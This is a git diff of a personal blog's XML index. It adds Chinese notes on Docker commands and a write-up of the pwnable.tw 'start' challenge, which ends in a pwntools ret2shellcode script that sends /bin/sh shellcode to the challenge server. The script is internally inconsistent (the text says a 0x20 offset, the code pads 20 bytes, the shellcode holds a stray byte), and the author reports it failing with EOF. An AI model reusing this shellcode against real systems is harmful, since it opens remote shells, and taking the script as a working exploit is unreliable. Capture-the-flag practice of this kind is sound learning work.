@@ -2575,9 +2575,36 @@ hr {
 <p>​    <a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%8811.54.51.png" data-caption="截屏2021-11-01 下午11.54.51" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%8811.54.51.png" alt="截屏2021-11-01 下午11.54.51"></a></p>
 <p>​    这个<code>hello world</code>其实就是被打包好的在特定环境下的程序，我们可以通过<code>docker cantainer run hello-world</code>指令将镜像创建为容器并运行。</p>
 <p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%8811.59.12.png" data-caption="截屏2021-11-01 下午11.59.12" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%8811.59.12.png" alt="截屏2021-11-01 下午11.59.12"></a></p>
-<p>​    </p>
+<h4 id="docker-build">docker build<a class="post-anchor" href="#docker-build"></a></h4><p>​    build指令使用dockerfile来创建新的容器。一般来说简单的构建命令就是</p>
+<pre><code class="bash">$ docker build -t imagename .
+</code></pre>
+<p>​    虽然我不是很理解这个<code>-t</code>    的参数意义何在，并且镜像名后面的“.”是干啥的。</p>
+<h4 id="docker-run">docker run<a class="post-anchor" href="#docker-run"></a></h4><p>​    创建一个新的容器并运行</p>
+<p>​    一般来说会有这几个参数</p>
+<pre><code class="bash">-d: 后台运行容器，并返回容器ID；
+
+-it: 以交互模式运行容器，并创建一个伪终端；
+
+-p: 指定端口映射，格式为：主机(宿主)端口:容器端口
+
+--name="nginx-lb": 为容器指定一个名称；
+
+-v：映射主机文件夹至容器内    
+</code></pre>
+<h4 id="docker-start-stop-retart">docker start/stop/retart<a class="post-anchor" href="#docker-start-stop-retart"></a></h4><p>​    启动或停止容器。</p>
+<p>​    指令为<code>docker start/stop/retart containerID</code></p>
+<h4 id="docker-pause">docker pause<a class="post-anchor" href="#docker-pause"></a></h4><p>​    暂停容器内全部进程。</p>
+<h4 id="docker-kill">docker kill<a class="post-anchor" href="#docker-kill"></a></h4><p>​    kill 运行的容器进程</p>
+<h4 id="docker-ps">docker ps<a class="post-anchor" href="#docker-ps"></a></h4><p>​    列出容器。</p>
+<pre><code class="bash">-a :显示所有的容器，包括未运行的。
+</code></pre>
+<h4 id="docker-attach">docker attach<a class="post-anchor" href="#docker-attach"></a></h4><p>​    连接到正在运行中的容器。</p>
+<p><code>docker attach containerID</code></p>
+<h4 id="docker-inspect">docker inspect<a class="post-anchor" href="#docker-inspect"></a></h4><p>​    获取容器/镜像的元数据。</p>
 <h2 id="参考">参考<a class="post-anchor" href="#参考"></a></h2><p><a href="https://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html">Docker 入门教程</a></p>
 <p><a href="https://www.runoob.com/docker/docker-image-usage.html">Docker 镜像使用</a></p>
+<p>​    </p>
+<p>​    </p>
 </body></html>]]></content>
       <tags>
         <tag>mess</tag>
@@ -2629,16 +2656,6 @@ hr {
       </tags>
   </entry>
   <entry>
-    <title>pawnable -- start</title>
-    <url>/2021/11/02/pwnable-start/</url>
-    <content><![CDATA[<html><head></head><body><h3 id="1">1)<a class="post-anchor" href="#1"></a></h3><p>​    为什么要再做这个签到题捏。</p>
-<p>​    主要是想试一下pwndocker的体验。</p>
-</body></html>]]></content>
-      <tags>
-        <tag>pwnable</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pwndocker的pwn题体验</title>
     <url>/2021/11/02/pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C/</url>
     <content><![CDATA[<html><head></head><body><h3 id="1）">1）<a class="post-anchor" href="#1）"></a></h3><p>​    之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。</p>
@@ -2669,7 +2686,36 @@ hr {
 <p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png" data-caption="截屏2021-11-03 下午10.14.12" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png" alt="截屏2021-11-03 下午10.14.12"></a></p>
 <p>​    愉快的gdb时间（（</p>
 <p>​    还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。</p>
-<p>TBC…</p>
+<p>​    然后是做题时间。</p>
+<p>​    这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png" data-caption="截屏2021-11-03 下午11.01.29" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png" alt="截屏2021-11-03 下午11.01.29"></a></p>
+<p>​    </p>
+<p>​    ps：关于cyclic的原理可以看我的pwntools源码解析系列。</p>
+<p>​    然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。</p>
+<p>​    还是要借助<code>docker run</code>的- v参数，大概就是<code>~/work/pwner:/ctf/work</code></p>
+<p>​    但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？</p>
+<p>​    后来重启一次之后就能立即同步到容器中了。好。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png" data-caption="截屏2021-11-03 下午11.16.05" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png" alt="截屏2021-11-03 下午11.16.05"></a></p>
+<p>​    </p>
+<p>​    有一点离谱。</p>
+<p>​    虽然但是，我超，pwndokcer真的好用。</p>
+<p>​    鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（</p>
+<p>​    所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。</p>
+<p>​    然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。</p>
+<p>​    shellcode就没必要手写了，<code>pwntools.shallcraft</code>直接生成。</p>
+<pre><code class="python">from pwn import*
+
+p = remote('chall.pwnable.tw',10000)
+
+shellcode=b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe33\xb0\x0b\xcd\x80'
+payload = b'a'*20
+payload += shellcode
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>​    摸了一圈，又EOF力。</p>
+<p>​    </p>
 </body></html>]]></content>
       <tags>
         <tag>pwnable</tag>
